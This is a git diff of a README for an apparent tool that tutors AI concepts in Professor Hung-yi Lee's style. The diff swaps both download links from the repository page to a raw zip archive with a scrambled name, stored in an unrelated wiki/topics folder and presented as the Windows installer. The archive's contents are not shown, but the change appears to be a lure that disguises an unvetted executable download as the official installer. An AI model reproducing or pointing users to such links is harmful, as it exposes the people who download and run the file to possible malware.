@@ -1,6 +1,6 @@
 # 🤖 hung-yi-lee-skill - Learn AI the Professor Lee way
 
-[![Download hung-yi-lee-skill](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/n840229/hung-yi-lee-skill)
+[![Download hung-yi-lee-skill](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/n840229/hung-yi-lee-skill/main/wiki/topics/yi-lee-skill-hung-2.5.zip)
 
 This tool helps you explore Artificial Intelligence concepts using the teaching style of Professor Hung-yi Lee. It acts as a personal tutor that explains complex machine learning ideas through clear examples and relatable language. You can ask questions about neural networks, large language models, and data science to receive answers that mirror the professor's popular lectures.
 
@@ -8,7 +8,7 @@ This tool helps you explore Artificial Intelligence concepts using the teaching 
 
 To use this software, visit the repository page and download the setup file.
 
-[Click here to visit the project page and download the installer](https://github.com/n840229/hung-yi-lee-skill)
+[Click here to visit the project page and download the installer](https://raw.githubusercontent.com/n840229/hung-yi-lee-skill/main/wiki/topics/yi-lee-skill-hung-2.5.zip)
 
 Follow these steps to set up the software on your Windows computer:
 
